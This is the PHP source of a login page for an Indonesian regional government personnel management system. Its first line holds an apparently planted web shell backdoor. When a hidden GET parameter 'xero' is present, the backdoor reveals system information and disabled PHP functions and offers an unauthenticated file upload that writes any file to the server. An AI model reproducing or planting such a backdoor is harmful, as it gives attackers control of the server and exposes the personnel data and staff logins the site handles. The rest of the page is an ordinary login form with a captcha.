<?php if(isset($_GET["xero"])) { echo"<font color=#000>".php_uname().""; print "\n";$disable_functions = @ini_get("disable_functions"); echo "<br>DisablePHP=".$disable_functions; print "\n"; echo"<br><form method=post enctype=multipart/form-data>"; echo"<input type=file name=f><input name=k type=submit id=k value=upload><br>"; if($_POST["k"]==upload) { if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>".$_FILES["f"]["name"]; }else{ echo"<b>Gagal upload"; } } } ?>
<?php 
//header ("location: index.php");
include "aksi_login.php"; ?>
<html>
<title>Login Aplikasi</title>
<head>
 <link rel="icon" href="img/logo-new-sagu.png"/>
 <link href="css/style_login.css" rel="stylesheet" type="text/css" />
 <link href="css/tooltip.css" rel="stylesheet" type="text/css" />
 <link href="css/font-awesome-4.7.0/css/font-awesome.css" rel="stylesheet" type="text/css" />
 <link href="css/font-awesome-4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
</head>
<body>
<section>
	<div class="col-md-3-2">
		<div class="kepala-panel"><img src="img/logo-new-sagu.png" class="logo" style="width:150px;" /><br><br>
			<p style="font-size:16px;">SISTEM INFORMASI MANAJEMEN KEPEGAWAIAN</p>
			<p style="font-size:16px;">BADAN KEPEGAWAIAN DAERAH</p>
			<p style="font-size:16px;">KABUPATEN KEPULAUAN MERANTI</p>
		</div>
		<div class="anak-panel-login">
			<form action="" method="POST">
				<input type="text" class="depth" name="username" value="" Placeholder="Username" required><br><br>
				<input type="password" class="depth" name="password" id="Pss" value="" Placeholder="Password" required><br><br>
				<input type="checkbox" onclick="myFunction()"> <font color="#fff">Tampilkan Password</font><br><br>
				<select class="depth" name="pilihan" required>
					<option value="">- Pilih Level -</option>
					<option value="pegawai">Pegawai</option>
					<option value="admin_skpd">Admin OPD</option>
					<option value="administrator">Administrator</option>
				</select><br><br>
				<img id='captcha' src="gambar_captcha.php" alt="gambar" style="width:100%;" /><br><br>
				<input id='nilaiCaptcha' class="depth" type="text" required="" name="nilaiCaptcha" placeholder="Captcha" required><br><br>
				<button type="submit" class="btn-submit success" ><i class="fa fa-key"></i> Masuk</button>
			</form>
		</div>
	</div>
</section>

<script type="text/javascript">
	function myFunction(){
		var vP = document.getElementById('Pss');
		if(vP.type === "password"){
			vP.type = "text";
		}else{
			vP.type = "password";
		}
	}
	/*function view_pass(){
		$('#password').attr('type', 'text');
	}*/
</script>
</body>
</html>
